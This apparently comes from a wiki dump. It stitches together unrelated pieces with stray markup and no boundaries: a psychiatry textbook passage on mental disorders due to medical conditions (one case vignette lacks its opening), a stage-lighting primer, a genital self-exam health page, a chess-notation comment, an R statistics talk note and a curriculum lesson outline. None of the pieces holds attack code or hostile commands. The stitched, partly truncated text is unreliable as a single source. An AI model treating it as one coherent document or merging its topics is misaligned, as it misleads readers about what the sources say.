The ''mental status exam'' may provide clues as to the &quot;secondary&quot; nature of the psychiatric disturbance; e.g., unusual cognitive deficits (such as severe memory impairment) in a patient presenting with anxiety (Goldman, 1992). Abnormal findings on ''physical examination'' (such as hypo- or hyperactive reflexes, signs of vitamin deficiency, etc.) and ''laboratory testing'' (such as anemia, decreased thyroid function, etc.) may also be helpful in discerning an underlying GMC.  
On the other hand, correction of an underlying physical abnormality or drug toxicity does not always translate into an ''immediate'' remission of secondary psychiatric symptoms; often, there is a &quot;lag&quot; between correction of the underlying medical or drug-related problem and return to euthymia or baseline mental state. Indeed, as Colon and Popkin observe, sometimes—despite correction of the underlying medical problem—the secondary psychiatric symptoms may develop &quot;a life of their own&quot; and persist for long periods (Colon &amp; Popkin, 2006). Furthermore, as O\’Brien et al (2006) note, 

&quot;In some cases (eg, adrenal insufficiency), appropriate and continued treatment of the underlying condition results in resolution of the psychiatric symptoms. In others (eg, SLE), treatment of the underlying condition may alleviate but may also exacerbate psychiatric symptoms.&quot;

''Advanced age, or older age of onset of psychiatric illness '' is sometimes a clue to an underlying GMC, though by no means an infallible one. Since the elderly (as well as the very young) are at greater risk for medical illnesses generally, the sudden appearance of apparent psychiatric symptoms in someone over the age of 55 ought to trigger a search for underlying medical factors (though one could say the same for a younger patient with a similarly abrupt onset of psychiatric illness). One\’s level of suspicion is generally highest in an ''older'' patient whose ''family history'' is &quot;negative&quot; for psychiatric disorders, and whose symptoms appear ''temporally linked to a GMC or drug-related event''. In this regard, Lo et al (2007) reported that compared to patients with (functional) Delusional Disorder, those with &quot;Organic Delusional Disorder&quot; usually had an older age of onset, and less frequently had a relevant family psychiatric history. Similarly, patients diagnosed with &quot;organic mood disorder&quot; were more likely to have a negative family history of depression, compared to medically-ill patients with a diagnosis of major depression (Yates et al, 1991). The patients with organic mood disorder were also less likely than their counterparts to have recovered fully after four years, despite similar treatment as those with major depression. As noted above, patients with older age at onset of affective illness, and without family history of depression, are more likely to have evidence of vascular CNS abnormalities on MRI than those with earlier onset illness.
With respect to temporal patterns, an important caveat is in order here: as Colon and Popkin (1996) judiciously observe:
&quot;Many clinicians are inclined to rely heavily on a temporal relation to establish an organic etiological relation. Although temporal relation is an instructive parameter, it may be misleading and subject to errors of recall. It is also apparent that psychiatric symptoms may antedate the clinical recognition of the physical illness—that is, anxiety and depression may be the first presenting features of a medical illness.&quot; (p. 413)
	Sometimes, the &quot;phenomenology&quot; of the syndrome may provide a clue as to its etiology, though this is far from universally the case. For example, when ''psychotic symptoms'' develop in the context of a GMC, they tend to present in a characteristic pattern. Thus, many secondary psychotic syndromes are characterized by paranoid delusions, persecutory thoughts, and ideas of reference. Delusions tend to be ''concrete and changeable'', in contrast to the often elaborate, bizarre, and relatively stable delusions seen in, say, schizophrenia or mania. Lishman characterizes &quot;organic delusions&quot; as often ''persecutory'' in content, but typically &quot;…poorly elaborated, vague, transient, and inconsistent…&quot; (Lishman, 1998, p. 11). So, for example, the elderly patient in a nursing home who develops an &quot;organic psychosis&quot; may say, on Monday, &quot;The nurses are trying to poison me.&quot; On Tuesday, the same patient may have no particular fears regarding the nurses, but may complain, &quot;My roommate is stealing my jewelry.&quot;  However, in organic delusional syndromes ''without clouding of consciousness'', Lishman notes that &quot;…the delusions may be more coherently organized, with a picture more closely resembling schizophrenia.&quot; 
	With respect to GMCs associated with anxiety, Colon and Popkin (1996) note that, &quot;…there are few current data to indicate whether panic emerging in the medical patient differs from that seen in the primary psychiatric setting. In addition, no data are available about factors such as course and onset in the medical setting.&quot; One exception is the finding by Starkman et al (1985) showing that in patients (N=17) with pheochromocytoma—a GMC long-associated with anxiety-- none described the severe apprehension or fear characteristic of panic attacks, and ''none described agoraphobia.'' 
	Depression in the medical setting is comprehensively reviewed by Rouchell et al (1996). Again, there are no pathognomonic signs that clearly point to &quot;secondary&quot; or &quot;organic&quot; depressive symptoms. In addition, the standard diagnostic criteria for major depression in DSM-IV have not been normed for individuals with co-morbid medical illness. However, Goldman (1992) offers the following clues suggesting an underlying medical cause: ''an atypical clinical picture; resistance to standard treatments; unexplained personality changes; and subtle cognitive findings on mental status exam''. 
	The course of Psy-GMCs depends to a large degree on the nature of the underlying medical condition and how responsive it is to primary treatment. The course is also influenced by the extent and success of symptomatic psychiatric treatment. For example, when there is a progressive or intermittently active degenerative CNS process at work, such as multiple sclerosis, course and outcome are likely to be less favorable. On the other hand, psychiatric symptoms due to acute anticholinergic toxicity may be resolved within a matter of hours, if diagnosis and treatment proceed expeditiously.

In the DSM-IV, ''Psychotic Disorder Due to GMC'' is sub-typed based on the predominant symptom; i.e., &quot;with delusions&quot; or &quot;with hallucinations&quot;. Of course, the two often occur together. The DSM-IV also specifies that the symptoms must not occur exclusively while the patient is ''delirious'', or be better explained by another mental disorder. 
Although a plethora of medical and neurological conditions may produce psychotic symptoms, particular attention should be focused on disorders affecting the ''occipital'' and ''temporal'' regions. For example, cerebral tumors in these regions may produce hallucinations in various modalities, as well as delusions (Sadock &amp; Sadock, 2007). The differential diagnosis of &quot;psychosis&quot; is therefore extremely important. In one study (Malmud, 1967) 6 of 11 patients with temporal lobe tumors initially presented with a diagnosis of ''schizophrenia, ''though other studies of patients with temporal lobe tumors have shown much lower rates of psychotic symptoms . ''Complex partial seizures'' originating in the temporal or frontal regions may also  produce psychotic-like symptoms, as well as olfactory or gustatory hallucinations. ''Substance-induced psychotic disorders'' are discussed in Chapter (    ). 

''Case vignette: Ms. A, a 38-year-old white female with long history of vague medical problems, was brought to emergency room by her family because she had boarded up all the windows at her house and refused to come outside. The patient claimed her neighbors were &quot;spying&quot; on her and &quot;want to do me in.&quot; She was fully oriented, and both recent and remote memory intact. There was no fluctuation in her level of consciousness. The patient denied any unusual perceptual changes, auditory, visual, or tactile hallucinations. Physical examination was essentially normal. However, laboratory studies revealed normocytic anemia, leukopenia, and red cell casts in urine. Subsequent testing for antinuclear antibody (ANA) was strongly positive; a provisional diagnosis of systemic lupus erythematosus (SLE) with cerebral involvement (&quot;lupus cerebritis&quot;) was made. ''

''Mood disorder due to general medical condition	''


''	''The DSM-IV recognizes four main subtypes of mood disorder due to a GMC: ''with depressive features; with major-depressive like episode; with manic features; ''and'' with mixed features. ''The ICD-10 uses a slightly different scheme, differentiating ''organic manic disorder; organic bipolar disorder; organic depressive disorder; ''and'' organic mixed affective disorder. ''
As with the psychoses due to GMCs, secondary mood disorders may stem from a multitude of underlying medical and neurological conditions. In consultation-liason settings, as noted earlier, the most frequent underlying GMCs were cerebrovascular accident (including stroke); Parkinson\’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis (Rundell &amp; Wise, 1989). Post-stroke depression merits special attention, in that as many as 50% of all post-stroke patients experience depressive illness. A similar percentage applies to patients with pancreatic cancer, and to about 40% of patients with Parkinson\’s Disease (Sadock &amp; Sadock, 2007). However, the diagnosis of depression in the medical setting is complicated by the substantial overlap between ''somatic symptoms'' related to the underlying GMC, and ''neurovegetative symptoms'' of depression (for review, see Harnett, 2001). For example, some data (Musselman et al, 1998) indicate that major depression is seen in approximately 15-20% of patients with coronary (ischemic) heart disease (IHD). However, depression may sometimes be over-diagnosed in this population if &quot;lethargy&quot; or &quot;apathy&quot; ''secondary to congestive heart failure'' is inappropriately counted as signifying major depression. There may also be over-diagnosis of depression in IHD patients who have become &quot;demoralized&quot;—but not clinically depressed—about their medical setbacks (Harnett, 2001). 
Indeed, the pathophysiological relationship between underlying medical illness and mood disorder is quite complex. For example, it is not always clear to what degree a depressed medical patient may be &quot;reacting psychologically&quot; to the incapacity stemming from a GMC; or experiencing subtle but direct ''biochemical and immunological effects on the brain'', stemming from the GMC (Harnett &amp; Pies, in press). One illustration of this is in the area of IHD. Depression-related immune dysfunction may worsen IHD via inflammatory cytokines (e.g., interleukin-6, tumor necrosis factor alpha). But IHD-related immune abnormalities may also contribute to depression (Kop et al, 2005). Moreover, social isolation, psychosocial stress, and low levels of perceived support are related to ''both ''depression ''and'' IHD, and could mediate bidirectional effects on these conditions (Barth et al, 2004; Lett et al, 2004). However depression is a well-established risk factor for increased mortality in post-myocardial infarction patients. In short, there are very complex relationships between underlying medical illness and the appearance of depressive symptoms. 
This is also true, to some degree, with ''medication-related'' mood alterations. Establishing a causal connection between ingestion of a particular drug and the development of clinical depression is far from straightforward, notwithstanding epidemiological evidence linking some drugs with depression (Rogers and Pies, 2008). Although often mentioned as causes of drug-induced depression, ''beta blockers'' and ''calcium channel blockers'' are only weakly-linked with this side effect. In contrast, some medications—such as ''alpha-interferon'' and ''isotretinoin''—do appear strongly, if not causally, linked with new- onset depression (Bonaccorso et al, 2002; Wysowski et al, 2001) 

		''Case vignette'': ''Mr. A., a 65-year-old married male without prior psychiatric history presented with a one month history of &quot;feeling really down.&quot; He also related that, for the past three weeks or so, he had experienced vague gastrointestinal distress; decreased appetite; and a 15-lb weight loss. One month earlier, a close friend had died after a long illness, and Mr. A. attributed his sadness to this recent loss. Mental status exam was notable for a pale, cachectic individual whose affect appeared somewhat blunted, with occasional tearfulness. Cognitive examination was essentially within normal limits. Physical examination revealed an enlarged, non-tender gallbladder, and slight jaundice. Urinary amylase levels were elevated. A CT scan of the abdomen revealed cancer of the head of the pancreas with obstruction of the gallbladder. ''

''Anxiety disorder due to general medical condition     ''
''       ''
''	''The DSM-IV defines three main subtypes of anxiety disorder due to GMC: with ''generalized anxiety'', with ''panic attacks'', and with ''obsessive-compulsive'' symptoms. Although the overall prevalence of anxiety due to GMCs is not known, there is substantial evidence that medically-ill individuals have higher rates of anxiety than does the general public (Sadock &amp; Sadock, 2007). For example, one study of patients with Parkinson\’s disease found that 38% of patients received a current DSM-III-R anxiety disorder diagnosis, including panic disorder, generalized anxiety disorder, and social phobia (Stein et al, 1990). Importantly, severity of anxiety was not correlated with severity of parkinsonian symptoms, cumulative duration of L-dopa exposure, or current dose of L-dopa. Similarly, among diabetic patients, the lifetime prevalence rates for phobic disorders and generalized anxiety disorders were 26.5% and 41%, respectively (Lustman et al, 1986). 
 As with other categories of secondary psychiatric symptoms, anxiety due to GMCs may stem from many underlying causes, as shown in '''Table 3'''.  ''Endocrinopathies''—notably, hyperthyroidism, hypo- and hyperparathyroidism, and pheochromocytoma—are commonly associated with anxiety (as well as with depression). ''Cardiac arrythmias'' may be both the cause, and the result, of anxiety, sometimes leading to a &quot;vicious cycle&quot;. For example, an individual with underlying heart disease who develops a &quot;run&quot; of supraventricular tachycardia may become very anxious upon experiencing the sensation of &quot;palpitations&quot;, and thereby exacerbate or prolong the tachycardia. Although ''mitral valve prolapse'' is mentioned in older textbooks as a cause of anxiety (especially panic attacks), the evidence for this link is actually tenuous. One recent review (Filho et al, 2008) concluded that, &quot;the more elaborate the study methodology, the lower the chance to observe a significant relationship between these (two) conditions.&quot;  
A number of degenerative brain diseases may be associated with marked anxiety, including Alzheimer\’s Disease (DAT), Wilson\’s Disease, and Huntington\’s Disease. The frequency of anxiety in patients with DAT averages 48%, versus about 6% in elderly patients without DAT (Mega et al, 1996; Apostolova &amp; Cummings, 2008). 
The list of ''medications'' causing anxiety is very extensive, and includes bronchodilators, thyroid preparations, theophylline, psychostimulants (such as methylphenidate), antipsychotics, and antidepressants. A variety of over-the-counter remedies, such as antihistamines and herbal preparations, may also trigger or exacerbate anxiety. Recently, anxiety, tachycardia, and even seizures have been linked with various &quot;energy drinks&quot; containing high concentrations of caffeine (Clauson et al, 2008).

She was alert and oriented, but appeared extremely anxious and tremulous.  Her breathing was rapid and patient complained of palpitations and lightheadedness.  She had learned the day before that she was facing eviction from her apartment. The provisional diagnosis was &quot;Panic attack with hyperventilation, precipitated by threat of eviction.&quot;  Physical exam was notable for a pulse of 120; diaphoresis; and localized wheezes upon auscultation of the chest. A chest radiograph was within normal limits. However, a perfusion scintiscan of the lung revealed acute pulmonary embolus, and the patient was immediately hospitalized.  ''

''Personality change due to general medical condition ''


DSM-IV recognizes five main subtypes of personality change due to general medical condition (PC-GMC); i.e., ''labile, disinhibited, aggressive, apathetic'', and'' paranoid.'' However, &quot;other&quot; &quot;combined&quot; and &quot;unspecified&quot; subtypes allow for the almost infinite variations and combinations of personality alterations that may be observed clinically. The older term &quot;organic personality syndrome&quot; also subsumes these categories. 
A variety of medical and neurological conditions may lead to alterations in the individual\’s usual personality, temperament, or life-long character traits. According to Reid (1989), the most common causes of PC-GMC (&quot;organic personality syndrome&quot;) are ''head trauma, cerebrovascular accident, ''and'' space-occupying intracranial lesions''. Other common causes include temporal lobe epilepsy, multiple sclerosis, chronic intoxications, endocrine disorders, and CNS infections such as neurosyphilis. 
It is useful to focus on personality alterations due to lesions or dysfunction in ''frontal-subcortical circuits'' and within the ''temporal lobes.''  Tekin &amp; Cummings (2002) have identified five parallel frontal-subcortical circuits that link specific areas of the ''frontal cortex'' to the striatum, basal ganglia and thalamus. Lesions originating in the ''orbitofrontal'' region lead to personality changes characterized by ''disinhibition''; e.g., the patient begins to use profanity or exhibit sexually provocative behaviors. Lesions originating in the ''anterior cingulate ''portion of the frontal cortex produce an ''apathetic'' picture; e.g., a once outgoing and vociferous individual becomes withdrawn, indifferent, and uninterested in his usual activities. 
Lesions or abnormal electrical activity in the temporal lobes also produce alterations in personality. For example, in temporal lobe epilepsy, the most common psychiatric abnormality is personality change (Chuang, 2006). Hyperreligiosity, hypergraphia, and hyposexuality are reportedly more common in patients with temporal lobe epilepsy than with other forms of epilepsy (Chuang, 2006), though not all neurologists accept this view. Tumors within or impinging upon the temporal lobes may also produce alterations in personality, including irritability, hypochondriasis, or an accentuation of neurotic traits. Some of these alterations may actually reflect temporal lobe epilepsy secondary to the tumor (Lishman, 1998).

''Case vignette: A 63 year-old banker was fired for inappropriate sexual advances toward employee. He was subsequently picked up by the police for urinating in parking lot of exclusive restaurant and shouting obscenities. His wife described him as &quot;just not himself over the past couple of months—it\’s like he has no self-control and no conscience.&quot; Neurological exam in the psychiatrist\’s office was essentially within normal limits, with no &quot;focal&quot; findings, except for abnormal grasp reflex (a tongue depressor repeatedly placed in the patient\’s hand led to his repeatedly grasping it). Magnetic resonance imagery (MRI) showed a large meningioma of the orbitofrontal cortex''.  

''Catatonic Disorder Due to General Medical Condition''

	&quot;Catatonia&quot; is probably best conceptualized as a syndrome with markedly diverse etiologies. Fink and Taylor (2006) have proposed three catatonia subtypes (''nonmalignant'', ''delirious'', and ''malignant'') and four specifiers (secondary to: mood disorders, general medical conditions or toxic states, neurological disorders, or psychotic disorders). 
When no identifiable medical or neurological cause is present, about 40% of cases prove secondary to mood disorders, whereas only about 10% are associated with schizophrenia (Sadock &amp; Sadock, 2007). Catatonic disorder due to GMC is not a well-studied phenomenon, and its prevalence has not been clearly established. Features include ''immobility, psychomotor agitation, mutism, negativism, grimacing, peculiar motor behaviors (such as assuming and maintaining unusual postures, sometimes characterized by &quot;waxy flexibility&quot;), echolalia, ''and ''echopraxia.'' Medical and neurological causes of catatonia include drug toxicity, including neuroleptic malignant syndrome (NMS), CNS neoplasms, encephalitis, head trauma, lesions of the fronto-subcortical circuit, and contralateral parietal lobe lesions (Ovsiew, 2008). When catatonia is accompanied by fever and autonomic instability, it may represent ''malignant catatonia'', a potentially lethal form of catatonia which needs emergent treatment with electroconvulsive therapy (ECT) (Fink &amp; Taylor, 2006). 
''Case vignette: A 53-year old male presented to a psychiatrist with a provisional diagnosis of &quot;late onset schizophrenia.&quot; The man had in fact been functioning quite well until about a year ago, when he developed insidious signs of forgetfulness, apathy, and abulia (loss of spontaneity and effort). Recently, he had also developed leg weakness and &quot;fainting spells.&quot; However, his presentation to the psychiatrist was one of mutism and marked decrease in voluntary movements of any kind; indeed, the psychiatrist described the patient as &quot;grossly catatonic.&quot; Given the atypical age of onset for schizophrenia, and history of leg weakness, an MRI was ordered. It revealed &quot;ventriculomegaly; hydrocephalus secondary to subthalamic mesencephalic tumor involving the third and the lateral ventricles.&quot; Surgical placement of a ventriculoperitoneal shunt led to resolution of the catatonia over a period of several days (Neuman et al, 1996). ''

''	Amnestic Disorder due to GMC''

''	Amnestic disorders'' entail impairment in the ability to learn new information, or to recall previously learned information''. ''Amnesia is most commonly found in patients with a history of ''alcohol abuse'' or ''head injury'', in which bilateral damage to mid-temporal lobe structures (such as the hippocampus, mamillary bodies or amgydala) has occurred. In the DSM-IV, the two primary categories are ''amnestic disorder due to GMC'', and ''substance-induced persisting amnestic disorder''. The latter will be discussed in chapter (   ), in relation to alcohol and benzodiazepine use. 
	Numerous GMCs may produce amnestic disorder, including ''thiamine deficiency, hypoglycemia, carbon monoxide poisoning, hypoxia, ''and'' herpes simplex encephalitis'', all of which tend to produce bilateral hippocampal damage (Sadock &amp; Sadock, 2007). 	Korsakoff\’s Syndrome (KS) is characterized by marked amnestic symptoms in the presence of generally preserved cognitive function in other spheres. Essentially, KS is the chronic amnestic phase of ''Wernicke-Korsakoff Syndrome,'' which is discussed in chapter (   ). Though the predominant defect in KS is usually ''anterograde'' amnesia—i.e., impaired ability to retain new memories--there is often a ''retrograde'' amnestic component as well. Usually, there is relative sparing of remote memory. Lishman (1998) has noted that the line between Korsakoff\’s Syndrome and so-called ''alcoholic dementia'' is not always sharp, and there are most likely gradations or intermediate states between these two conditions.  KS–though conventionally attributed to thiamine deficiency—is closely associated with ''alcohol abuse and dependence''. Indeed, Lishman (1998) goes so far as to opine that, &quot;…the rarity of a fully fledged Korsakoff syndrome as a residue of thiamine deficiency in non-alcoholics raises the possibility that a direct neurotoxic action of alcohol may play some part in the evolution of the condition (p. 582). 

'''Medical and Laboratory Evaluation for Psy-GMC'''

'''	'''Given the prevalence of undetected medical illness in psychiatric populations, it is incumbent upon the physician to treat all putative &quot;psychiatric&quot; symptoms with a certain degree of skepticism'''. 	'''As noted earlier in this chapter, one\’s degree of suspicion is raised when the patient presents with a recent change in mental status, particularly when this occurs in temporal proximity to a known medical illness or drug-related event. Atypical presentations; late-life onset; and illness that fails to respond to standard therapies should all raise ones suspicion of a medical cause. The basic &quot;work up&quot; of suspected psychiatric symptoms due to GMC is outlined in Table 4. 
'''			(Table 4 about here) '''

'''	Table 4: Laboratory and Physical Evaluation for Psy-GMC'''
* Vital signs 
* Assess for pain complaints
* Gross physical exam immediately; complete physical ASAP with close attention to neurologic exam and detailed mental status examination 
* Complete blood count, electrolytes, blood urea nitrogen, creatinine, glucose, VDRL (screening for syphilis), liver function tests, thyroid function tests, serum calcium, magnesium, phosphate, ammonia, erythrocyte sedimentation rate, HIV testing (where risk factors are present) 
* Electrocardiogram (chest radiograph in selected cases)
* O2 saturation
* Urinalysis/drug screen
* ? EEG (helpful in confirming, monitoring delirium)


''Treatment of Psy-GMCs''

''Treatment'' of individual Psy-GMCs is beyond the scope of this chapter, since it necessarily focuses on primary treatment of the numerous underlying medical conditions. Symptomatic treatment with psychotropic agents may be conservative for Psy-GMCs, and depends on whether the predominant disturbance is in the realm of mood, reality testing (psychosis), anxiety, personality, etc. Though psychotropics aimed at a particular GMC-related symptom may sometimes be useful—e.g., antipsychotics for &quot;organic&quot; psychosis, or antidepressants for depression due to a GMC—most psychotropics run the risk of further clouding the patient\’s mental state, or introducing side effects and drug-drug interactions. Nevertheless, there is a role for judicious use of psychotropics in certain instances; e.g., antidepressants in post-stroke depression, or depression related to Parkinson\’s disease.

      <text xml:space="preserve">Lighting for the stage involves manipulating the four major Controllable Qualities of light; Intensity, Color, Direction and Movement; to influence the four functions of stage lighting which are Mood, Selective Focus, Modeling and Visibility.

'''Four Controllable Qualities of Light'''
*Intensity--The intensity of a light source can vary from near total darkness to painfully bright.
*Color--Nearly any color you can think of can be created through the use of lighting gels or electronic means.  Color can be a major player in creating a mood.  However, the lighting designer must be careful in choosing colors so that they coordinate with the colors chosen for costumes and set pieces as well.
*Direction--This is the area from which the light approaches the stage.  This is a major contributor to the function of modeling.  Light can come from below, directly above or anywhere in between.  They can also originate from in front of the actors, behind them or off to a side.  Each combination of directions has its unique effect on the highlights and shadows produced.
*Movement--refers to the changing in the lights whether it be a change in intensity, color or direction of origin.

'''Functions of Stage Lighting'''
*Visibility is the primary function of stage lighting:  making sure the audience can see the part(s) of the stage that the director and/or the lighting designer want them to see.
*The modeling function includes creating a realistic (or intentionally non-realistic) view of the world of the play.  This is done by strategically placing lights above, below, to the side, in front and behind the actors.  Through the use of the placement of the lights, you can create different types of highlights and shadows on the actors, props and set pieces.
*Selective Focus is the function of &quot;forcing&quot; the audience to look where it is desired for them to look through the use of high/low intensity and changes in intensity.
*The function of Mood is both one of the most difficult and at the same time the easiest function to maintain.  It is the easiest because it can be done very simply through the use of colors.  However, it can also be overdone to the point of becoming cliche instead of allowing the actors and other aspects to contribute to the overall mood of the play.

      <text xml:space="preserve">==What is a Genital Self Examination?==

A genital self exam is used to check for signs and symptoms that might indicate the presence of a sexually transmitted infection (STI) or to find any abnormalities that could indicate a more serious problem such as cancer.

A genital self exam, sometimes referred to as a GSE, is very important for both men and women to perform on themselves. Once a month is the time to physically explore an area of your body that is often overlooked, and to be on the hunt for anything that appears out of the ordinary. It is very important to become familiar with your genitalia upon reaching puberty in order to detect the difference between what is normal and what is not. This provides a baseline to compare future exams to so you can notice if something has changed.  A genital self exam is used to check for signs and symptoms that might indicate the presence of a sexually transmitted infection (STI) or to find any abnormalities that could indicate a more serious problem such as cancer. Quite often a person will find nothing at all, but it is always best to confirm regularities rather than let something go untreated because it was not noticed.

==Why is a GSE Important?==
Genital self exams are extremely important because they are what can help determine if a sexually transmitted infection or abnormality is present. &lt;br /&gt;&lt;br /&gt;
Unfortunately, there are many STIs that go unnoticed and thus are not treated because the person does not realize they have one.Often there are many STI’s that have similar symptoms to one another which are easily confused amongst each other as well as other diseases, and other STI’s that go away on their own, but will always come back if they go untreated. It is important to know this because if you were ever to find something, it should be brought to the attention of a health professional so that you can be tested before spreading it to anyone else.&lt;br /&gt; 
Genital self exams are significant to a person’s health and well being because they help to detect and prevent further complications that could arise with the contraction of an STI. Without treatment, long term effects of STI’s can include infertility, heart disease, neurological damage, as well as physical scarring and damage to internal and external genitalia. The sooner something irregular is found and treated, the shorter the recovery period and the lesser the chance of suffering from serious health complications. 

==Who should perform Genital Self Exams?==
As mentioned earlier, it is important for each individual to become familiar with their body around the time that they begin sexual maturation. More specifically both men and women should begin performing these self exams around the age of fifteen and should continue throughout the duration of their life. 

==How Often and When Should a GSE be Performed?==
It is recommended to perform a GSE at least once a month and the best times to complete it would be after a warm bath or shower which relaxes both the mind and muscles making the exam easier.

==What You Are Looking For==
When doing a self genital exam it is important to look for things that are new, or were not there before. You want to look for things such as sores, discharge, and other problems such as genital warts.

''Females''- should be looking for regular discharge which is usually a cloudy white color. This should normally smell almost like vinegar. Depending on where in the menstrual cycle a female may be the thickness may differ. During the exam there should be no pain. If there is this could indicate an infection. If this discharge smells or looks different it could indicate a problem which should be checked out by a doctor. Also if you find anything that you feel isn’t supposed to be there or hurts, you should get checked.

''Males''- should be looking for bumps and lumps on or in the testes. Also anything abnormal or things you notice that are different should be looked at by a doctor. Testes that have not descended or “dropped” shortly after birth can be at risk for testicular cancer. Also look for swelling or shrinking of either the penis or testes. This can be an indicator of a problem along with any other visible differences. Regardless of age self genital examinations should be done regularly for boys or men. Lumps found in the testes which could be testicular cancer are usually painless and swollen. 

==Prevention==
By doing these exams on themselves it can prevent passing an STD onto your partner if you notice it soon enough. In order to prevent this from happening you must educate yourself on how the symptoms of an STD my feel and look. 

As teens grow up they go through changes with their bodies which also can cause them to be unsure what is happening with their body and if it is normal or not. It is important for teens who are having sex to make themselves aware of what is out there and also educate themselves with what is normal changes for their body to go through and things to keep on the lookout for that are not. Self genital exams can help find a problem if there is one.

It is important to remember that not all STDs turn up right away, some can take up to six months to turn up in the blood.

''Male''- Self genital exams can prevent testicular cancer or catch it before it is too late. Catching testicular cancer at its earliest stage is the easiest and most curable case. Self genital exams can also prevent STD’s as well for males. 

''Female''- Self genital exams and help woman prevent from STD’s as well. It is harder to predict cancers for females though such as cervical because it is within the body. It is important to get your annual checkups by your doctors to prevent such things. 

==What to do if you find something after doing a genital self exam==
If one finds something abnormal when doing a self-exam, an appointment should be made with one’s physician immediately. A private doctor is sufficient, as well as a family planning clinic. However, one should know that when dealing with a family planning clinic, the fee one is asked to pay may be different depending on the client’s income. One should make sure to check about the payment options before visiting.

With men, if a lump or swelling of the testicle, or even a pain in the lower stomach or groin area a health care provider should be contacted immediately to get a check for testicular cancer. If found soon enough, the cancer can be cured when dealt with properly.

==Easy Tips to Remember==

For ''Women''
:-	Squat, stand, or sit over a mirror
:-	Look for white, reddish areas around the vulva as well as any new moles or freckles.
:-	Any sudden changes in the color or appearance of the skin should be taken seriously.
:-	Slight changes in color around the vulva will occur depending on exercise, age.
:-	Check for sores, small cuts,  or lesions as well as any lumps.

For ''Men''
:-	Look for a change in color or appearance with the scrotum.
:-	Use the middle and index fingers under the testicle with a thumb on top.
:-	Roll the testicle between the fingers, noting any lumps, firmness of the testicle or painful areas.

The entire genital area should be checked including the penis, upper thigh area, and any other area near the genitals.
:-	In this case one should look for lumps or sores anywhere around these areas.
:-	Check for any involuntary discharge from the tip of the penis.

==Risks of Performing an Exam==
The only risk to doing a genital self-exam is if a male squeezes the testicles too hard when checking them. This will result in a subtle pain in the abdomen.

12. Nbd2 is impossible as a pawn is occupying the square. Also, 12...Bf8 is impossible as a rook is occupying that square. It seems that a move &quot;11.5&quot; is missing (11.5. d4, Re8).</text>

      <text xml:space="preserve">== &quot;Summing up for all values gives us Y = 7.0000.&quot; ==
There's an issue here. The original vector is: &lt;br&gt;
&gt; wiki1$var1&lt;br&gt;
[1]  88  93 110  76  78 121  92  86&lt;br&gt;

The standardizd vector is: &lt;br&gt;
&gt; wiki1$Z.var1&lt;br&gt;
[1] -0.3245  0.0000  1.1033 -1.1033 -0.9735  1.8172 -0.0649 -0.4543&lt;br&gt;

The sum of all the values of the standardized vector is: &lt;br&gt;
&gt; with(wiki1, {sum(Z.var1)})&lt;br&gt;
[1] 1.110e-16&lt;br&gt;

, which is zero, and by no means &quot;7.0000&quot;. Then, how is 7 obtained? And what does Y stand for?</text>

== Main Questions: ==

How are these definitions &amp; influences changing with the emergence of information society and globalization? What is the role of personal computing devices in this change?
 

== Objectives ==

Students will be able to:

*Define terms
*Discuss the role information society has played in defining the curriculum
*Identify how computers have changed the way students learn
*Discuss how information society characterized by computers and media have influenced curriculum development

== Definitions ==

'''Curriculum''': course of study offered by an educational institution.

'''Information Society''': a society in which the creation, distribution, diffusion, use, integration and manipulation of information is a significant economic, political, and cultural activity (Wikimedia, 2008).

'''Industrial Society''': &quot;...refers to a society with a modern societal structure.&quot;; i.e. industrial revolution. &quot;...generally mass societies.&quot; (Wikimedia, 2008).

'''Globalization''': &quot;...process of transformation of local or regional phenomena into global ones.&quot; &quot;...people of the world are unified into a single society and function together.&quot; (Wikimedia, 2009).

'''Society''': “…population of humans characterized by patterns of relationships between individuals that share…distinctive culture and/or institutions”. Broader: “…economic, social and industrial infrastructure, made up of a varied multitude of people.” (Wikimedia, 2009).

'''Political''': of or concerned with government, the state, or politics (LoveToKnow, 2009).

'''Economic''': of or relating to the production, development, and management of material wealth, as of a country, household, or business enterprise (Yahoo! Education, 2000).

'''Information Literacy''': the ability to identify what information is needed and the ability to locate, evaluate, and use information in solving problems and composing discourse.

== Introduction ==

Society, Political, Technological, and Philosophy not only influence today's curriculum, but they influence each other as well.  Each affects and is effected by one or more of the other.  Industrial and Informational Societies are heavily influenced by these four points.  Industrial Society curriculum was based on occupations and jobs that were based on individual performance and foundational objectives.  Currently, we are moving from an Industrial Society (a society evolved from the influences of John Franklin Bobbitt and Werrett Wallace Charters) that has always prepared students, and even adults, for the inevitability of working in meaningless jobs to Informational Society (a society evolved from John Dewey and Ralph W. Tyler) which has pushed us past just working at meaningless jobs to thinking about careers that bring them more enjoyment and better paying wages, which, in turn, make the curriculum mean something more to the student/adult.

In keeping with this phenomenon of today's school curriculum, we can see how heavily influenced the emergence of the Information Society really is. Furthermore, social accountability and other domestic pressures also influence how we see the school curriculum. Information Society is the notion that information sharing and development are the key aspects of modern society. In this vein, modern curriculum requires us to be more information centered. As of now, learners are being prepared to master subject matter as well as to master the use of technology and higher level cognitive skills instead of just pushing towards only working towards a meaningless and unappealing job. 


== Curriculum Approaches and Definitions ==

The information age curriculum is directed by societal influences that are more global and more technology driven.  In this sense, curriculum is seen as both school based (formal) and life based (informal). In a globalized society the curriculum is becoming more directed towards creativity and innovation with technology.  In this age there is a need for more learner centered instruction, hands on approaches to learner and more authentic learning experiences. As a result curriculum has come to mean more than a &quot;planned series of educational experiences&quot; (). 
 
To be sure, these new approaches to curriculum is consistent with the Progressive school of curriculum theorists dating back to John Dewey.  Following Dewey's model for learning:  Become aware of the problem, define the problem, propose a hypothesis to solve the problem, evaluate what would happen using past experiences, and test the best solution.  Having students learn from their own experiences and being able to use those experiences for future problems is an important approach to Dewey's model.  The jobs in the future will require critical thinkers and problem solvers.  We are no longer teaching children for industrial jobs, but jobs that need a more communicative individual who can use experiences to their benefit.   
 
Tyler's approach was that of the &quot;Four Basic Principles&quot;.  You must first find the purpose of the school.  Next, create educational experiences for the purpose of the school.  Then, you must organize the experiences.  Finally, you must evaluate the purposes.  To find the purpose, you must look at three things.  You must look at the learner (student), the subject matter, and society.  By looking at these three things, you will have a better understanding on what your approach should be for your purpose (objectives). 
 
&quot;How we conceive of curriculum and curriculum making is important because our conceptions and ways of reasoning about curriculum reflect and shape how we see, think and talk about, study and act on the education made available to students&quot; Cornbleth(1990). 

